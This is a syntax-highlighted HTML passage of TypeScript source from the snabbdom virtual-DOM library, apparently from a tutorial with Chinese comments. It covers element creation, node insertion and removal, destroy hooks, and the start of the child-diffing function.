<span class="token keyword">function</span> <span class="token function">createKeyToOldIdx</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">children</span><span class="token operator">:</span> VNode<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token literal-property property">beginIdx</span><span class="token operator">:</span> number<span class="token punctuation">,</span> <span class="token literal-property property">endIdx</span><span class="token operator">:</span> number</span><span class="token punctuation">)</span><span class="token operator">:</span> KeyToIndexMap <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token literal-property property">map</span><span class="token operator">:</span> KeyToIndexMap <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> beginIdx<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> endIdx<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> key <span class="token operator">=</span> children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">?.</span>key<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      map<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> map<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> <span class="token literal-property property">hooks</span><span class="token operator">:</span> Array<span class="token operator">&lt;</span>keyof Module<span class="token operator">&gt;</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'create'</span><span class="token punctuation">,</span> <span class="token string">'update'</span><span class="token punctuation">,</span> <span class="token string">'remove'</span><span class="token punctuation">,</span> <span class="token string">'destroy'</span><span class="token punctuation">,</span> <span class="token string">'pre'</span><span class="token punctuation">,</span> <span class="token string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token punctuation">{</span> h <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./h'</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> <span class="token punctuation">{</span> thunk <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./thunk'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">init</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">modules</span><span class="token operator">:</span> Array<span class="token operator">&lt;</span>Partial<span class="token operator">&lt;</span>Module<span class="token operator">&gt;&gt;</span><span class="token punctuation">,</span> domApi<span class="token operator">?</span><span class="token operator">:</span> <span class="token constant">DOMAPI</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> <span class="token literal-property property">i</span><span class="token operator">:</span> number<span class="token punctuation">,</span> <span class="token literal-property property">j</span><span class="token operator">:</span> number<span class="token punctuation">,</span> cbs <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token keyword">as</span> ModuleHooks<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> <span class="token literal-property property">api</span><span class="token operator">:</span> <span class="token constant">DOMAPI</span> <span class="token operator">=</span> domApi <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token operator">?</span> domApi <span class="token operator">:</span> htmlDomApi<span class="token punctuation">;</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> hooks<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    cbs<span class="token punctuation">[</span>hooks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> modules<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> hook <span class="token operator">=</span> modules<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>hooks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>hook <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token punctuation">(</span>cbs<span class="token punctuation">[</span>hooks<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">as</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>hook<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">emptyNodeAt</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">elm</span><span class="token operator">:</span> Element</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> id <span class="token operator">=</span> elm<span class="token punctuation">.</span>id <span class="token operator">?</span> <span class="token string">'#'</span> <span class="token operator">+</span> elm<span class="token punctuation">.</span>id <span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> c <span class="token operator">=</span> elm<span class="token punctuation">.</span>className <span class="token operator">?</span> <span class="token string">'.'</span> <span class="token operator">+</span> elm<span class="token punctuation">.</span>className<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">vnode</span><span class="token punctuation">(</span>api<span class="token punctuation">.</span><span class="token function">tagName</span><span class="token punctuation">(</span>elm<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> id <span class="token operator">+</span> c<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> elm<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">createRmCb</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">childElm</span><span class="token operator">:</span> Node<span class="token punctuation">,</span> <span class="token literal-property property">listeners</span><span class="token operator">:</span> number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token function">rmCb</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">--</span>listeners <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> parent <span class="token operator">=</span> api<span class="token punctuation">.</span><span class="token function">parentNode</span><span class="token punctuation">(</span>childElm<span class="token punctuation">)</span><span class="token punctuation">;</span>
        api<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>parent<span class="token punctuation">,</span> childElm<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">createElm</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">vnode</span><span class="token operator">:</span> VNode<span class="token punctuation">,</span> <span class="token literal-property property">insertedVnodeQueue</span><span class="token operator">:</span> VNodeQueue</span><span class="token punctuation">)</span><span class="token operator">:</span> Node <span class="token punctuation">{</span>
    <span class="token keyword">let</span> <span class="token literal-property property">i</span><span class="token operator">:</span> any<span class="token punctuation">,</span> data <span class="token operator">=</span> vnode<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> init <span class="token operator">=</span> data<span class="token punctuation">.</span>hook<span class="token operator">?.</span>init<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDef</span><span class="token punctuation">(</span>init<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">init</span><span class="token punctuation">(</span>vnode<span class="token punctuation">)</span><span class="token punctuation">;</span>
        data <span class="token operator">=</span> vnode<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">let</span> children <span class="token operator">=</span> vnode<span class="token punctuation">.</span>children<span class="token punctuation">,</span> sel <span class="token operator">=</span> vnode<span class="token punctuation">.</span>sel<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>sel <span class="token operator">===</span> <span class="token string">'!'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isUndef</span><span class="token punctuation">(</span>vnode<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        vnode<span class="token punctuation">.</span>text <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      vnode<span class="token punctuation">.</span>elm <span class="token operator">=</span> api<span class="token punctuation">.</span><span class="token function">createComment</span><span class="token punctuation">(</span>vnode<span class="token punctuation">.</span>text<span class="token operator">!</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>sel <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// Parse selector</span>
      <span class="token keyword">const</span> hashIdx <span class="token operator">=</span> sel<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> dotIdx <span class="token operator">=</span> sel<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> hashIdx<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> hash <span class="token operator">=</span> hashIdx <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">?</span> hashIdx <span class="token operator">:</span> sel<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
      <span class="token keyword">const</span> dot <span class="token operator">=</span> dotIdx <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">?</span> dotIdx <span class="token operator">:</span> sel<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
      <span class="token keyword">const</span> tag <span class="token operator">=</span> hashIdx <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">||</span> dotIdx <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">?</span> sel<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> dot<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> sel<span class="token punctuation">;</span>
      <span class="token keyword">const</span> elm <span class="token operator">=</span> vnode<span class="token punctuation">.</span>elm <span class="token operator">=</span> <span class="token function">isDef</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isDef</span><span class="token punctuation">(</span>i <span class="token operator">=</span> data<span class="token punctuation">.</span>ns<span class="token punctuation">)</span>
        <span class="token operator">?</span> api<span class="token punctuation">.</span><span class="token function">createElementNS</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> tag<span class="token punctuation">)</span>
        <span class="token operator">:</span> api<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>tag<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>hash <span class="token operator">&lt;</span> dot<span class="token punctuation">)</span> elm<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> sel<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>hash <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> dot<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>dotIdx <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> elm<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'class'</span><span class="token punctuation">,</span> sel<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>dot <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cbs<span class="token punctuation">.</span>create<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> cbs<span class="token punctuation">.</span>create<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>emptyNode<span class="token punctuation">,</span> vnode<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>is<span class="token punctuation">.</span><span class="token function">array</span><span class="token punctuation">(</span>children<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> children<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">const</span> ch <span class="token operator">=</span> children<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            api<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>elm<span class="token punctuation">,</span> <span class="token function">createElm</span><span class="token punctuation">(</span>ch <span class="token keyword">as</span> VNode<span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>is<span class="token punctuation">.</span><span class="token function">primitive</span><span class="token punctuation">(</span>vnode<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        api<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>elm<span class="token punctuation">,</span> api<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span>vnode<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">const</span> hook <span class="token operator">=</span> vnode<span class="token punctuation">.</span>data<span class="token operator">!</span><span class="token punctuation">.</span>hook<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDef</span><span class="token punctuation">(</span>hook<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        hook<span class="token punctuation">.</span>create<span class="token operator">?.</span><span class="token punctuation">(</span>emptyNode<span class="token punctuation">,</span> vnode<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>hook<span class="token punctuation">.</span>insert<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          insertedVnodeQueue<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>vnode<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      vnode<span class="token punctuation">.</span>elm <span class="token operator">=</span> api<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span>vnode<span class="token punctuation">.</span>text<span class="token operator">!</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> vnode<span class="token punctuation">.</span>elm<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">addVnodes</span> <span class="token punctuation">(</span>
    <span class="token parameter"><span class="token literal-property property">parentElm</span><span class="token operator">:</span> Node<span class="token punctuation">,</span>
    <span class="token literal-property property">before</span><span class="token operator">:</span> Node <span class="token operator">|</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
    <span class="token literal-property property">vnodes</span><span class="token operator">:</span> VNode<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token literal-property property">startIdx</span><span class="token operator">:</span> number<span class="token punctuation">,</span>
    <span class="token literal-property property">endIdx</span><span class="token operator">:</span> number<span class="token punctuation">,</span>
    <span class="token literal-property property">insertedVnodeQueue</span><span class="token operator">:</span> VNodeQueue</span>
  <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> startIdx <span class="token operator">&lt;=</span> endIdx<span class="token punctuation">;</span> <span class="token operator">++</span>startIdx<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> ch <span class="token operator">=</span> vnodes<span class="token punctuation">[</span>startIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        api<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>parentElm<span class="token punctuation">,</span> <span class="token function">createElm</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span> insertedVnodeQueue<span class="token punctuation">)</span><span class="token punctuation">,</span> before<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">invokeDestroyHook</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">vnode</span><span class="token operator">:</span> VNode</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> data <span class="token operator">=</span> vnode<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      data<span class="token operator">?.</span>hook<span class="token operator">?.</span>destroy<span class="token operator">?.</span><span class="token punctuation">(</span>vnode<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cbs<span class="token punctuation">.</span>destroy<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> cbs<span class="token punctuation">.</span>destroy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>vnode<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>vnode<span class="token punctuation">.</span>children <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> vnode<span class="token punctuation">.</span>children<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">const</span> child <span class="token operator">=</span> vnode<span class="token punctuation">.</span>children<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>child <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> child <span class="token operator">!==</span> <span class="token string">&quot;string&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">invokeDestroyHook</span><span class="token punctuation">(</span>child<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">function</span> <span class="token function">removeVnodes</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">parentElm</span><span class="token operator">:</span> Node<span class="token punctuation">,</span>
    <span class="token literal-property property">vnodes</span><span class="token operator">:</span> VNode<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token literal-property property">startIdx</span><span class="token operator">:</span> number<span class="token punctuation">,</span>
    <span class="token literal-property property">endIdx</span><span class="token operator">:</span> number</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> startIdx <span class="token operator">&lt;=</span> endIdx<span class="token punctuation">;</span> <span class="token operator">++</span>startIdx<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">let</span> <span class="token literal-property property">listeners</span><span class="token operator">:</span> number<span class="token punctuation">,</span> <span class="token function-variable function">rm</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">void</span><span class="token punctuation">,</span> ch <span class="token operator">=</span> vnodes<span class="token punctuation">[</span>startIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>ch <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDef</span><span class="token punctuation">(</span>ch<span class="token punctuation">.</span>sel<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token function">invokeDestroyHook</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// hook 操作</span>

          <span class="token comment">// 移除 DOM 元素</span>
          listeners <span class="token operator">=</span> cbs<span class="token punctuation">.</span>remove<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
          rm <span class="token operator">=</span> <span class="token function">createRmCb</span><span class="token punctuation">(</span>ch<span class="token punctuation">.</span>elm<span class="token operator">!</span><span class="token punctuation">,</span> listeners<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cbs<span class="token punctuation">.</span>remove<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> cbs<span class="token punctuation">.</span>remove<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span> rm<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">const</span> removeHook <span class="token operator">=</span> ch<span class="token operator">?.</span>data<span class="token operator">?.</span>hook<span class="token operator">?.</span>remove<span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDef</span><span class="token punctuation">(</span>removeHook<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">removeHook</span><span class="token punctuation">(</span>ch<span class="token punctuation">,</span> rm<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token function">rm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment">// Text node</span>
          api<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>parentElm<span class="token punctuation">,</span> ch<span class="token punctuation">.</span>elm<span class="token operator">!</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// diff算法核心</span>
  <span class="token keyword">function</span> <span class="token function">updateChildren</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token literal-property property">parentElm</span><span class="token operator">:</span> Node<span class="token punctuation">,</span>
    <span class="token literal-property property">oldCh</span><span class="token operator">:</span> VNode<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token literal-property property">newCh</span><span class="token operator">:</span> VNode<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token literal-property property">insertedVnodeQueue</span><span class="token operator">:</span> VNodeQueue</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> oldStartIdx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> newStartIdx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> oldEndIdx <span class="token operator">=</span> oldCh<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> oldStartVnode <span class="token operator">=</span> oldCh<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> oldEndVnode <span class="token operator">=</span> oldCh<span class="token punctuation">[</span>oldEndIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> newEndIdx <span class="token operator">=</span> newCh<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> newStartVnode <span class="token operator">=</span> newCh<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> newEndVnode <span class="token operator">=</span> newCh<span class="token punctuation">[</span>newEndIdx<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token literal-property property">oldKeyToIdx</span><span class="token operator">:</span> KeyToIndexMap <span class="token operator">|</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token literal-property property">idxInOld</span><span class="token operator">:</span> number<span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token literal-property property">elmToMove</span><span class="token operator">:</span> VNode<span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token literal-property property">before</span><span class="token operator">:</span> any<span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span>oldStartIdx <span class="token operator">&lt;=</span> oldEndIdx <span class="token operator">&amp;&amp;</span> newStartIdx <span class="token operator">&lt;=</span> newEndIdx<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>oldStartVnode <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        oldStartVnode <span class="token operator">=</span> oldCh<span class="token punctuation">[</span><span class="token operator">++</span>oldStartIdx<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// Vnode might have been moved left</span>
